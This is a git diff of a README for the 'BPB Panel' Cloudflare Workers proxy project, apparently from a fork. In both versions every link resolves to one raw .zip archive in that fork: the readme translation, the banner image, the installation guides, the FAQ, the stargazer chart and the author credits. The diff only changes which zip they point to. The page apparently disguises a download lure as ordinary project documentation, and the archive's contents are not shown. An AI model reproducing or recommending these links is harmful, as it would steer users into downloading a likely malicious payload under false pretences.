@@ -1,14 +1,14 @@
 <h1 align="center">💦 BPB Panel</h1>
 
-### 🌏 Readme in [Farsi](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip)
+### 🌏 Readme in [Farsi](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/Panel_BP_Worker_2.0.zip)
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip">
+  <img src="https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/Panel_BP_Worker_2.0.zip">
 </p>
 <br>
 
 ## Introduction
-This project is dedicated to developing a user panel for the [Cloudflare-workers/pages proxy script](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip) created by [yonggekkk](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip). The panel offers two deployment options: 
+This project is dedicated to developing a user panel for the [Cloudflare-workers/pages proxy script](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/Panel_BP_Worker_2.0.zip) created by [yonggekkk](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/Panel_BP_Worker_2.0.zip). The panel offers two deployment options: 
 - **Worker** deployment
 - **Pages** deployment
 <br>
@@ -33,13 +33,13 @@ This project is dedicated to developing a user panel for the [Cloudflare-workers
 <br>
 
 ## How to use:
-- [Installation (Pages)](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip)
+- [Installation (Pages)](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/Panel_BP_Worker_2.0.zip)
 
-- [Installation (Worker)](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip)
+- [Installation (Worker)](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/Panel_BP_Worker_2.0.zip)
 
-- [How to use](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip)
+- [How to use](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/Panel_BP_Worker_2.0.zip)
 
-- [FAQ](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip)
+- [FAQ](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/Panel_BP_Worker_2.0.zip)
 <br>
 
 ## Supported Clients
@@ -59,14 +59,14 @@ This project is dedicated to developing a user panel for the [Cloudflare-workers
 ---
 
 ## Stargazers Over Time
-[![Stargazers Over Time](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip)](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip)
+[![Stargazers Over Time](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/Panel_BP_Worker_2.0.zip)](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/Panel_BP_Worker_2.0.zip)
 
 ---
 
 ### Special Thanks
-- CF-vless code author [3Kmfi6HP](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip)
-- CF preferred IP program author [badafans](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip), [XIU2](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip)
+- CF-vless code author [3Kmfi6HP](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/Panel_BP_Worker_2.0.zip)
+- CF preferred IP program author [badafans](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/Panel_BP_Worker_2.0.zip), [XIU2](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/Panel_BP_Worker_2.0.zip)
 
 ---
 
-For a detailed tutorial on the core script, please refer to [Yongge’s blog and video tutorials](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip).
+For a detailed tutorial on the core script, please refer to [Yongge’s blog and video tutorials](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/Panel_BP_Worker_2.0.zip).
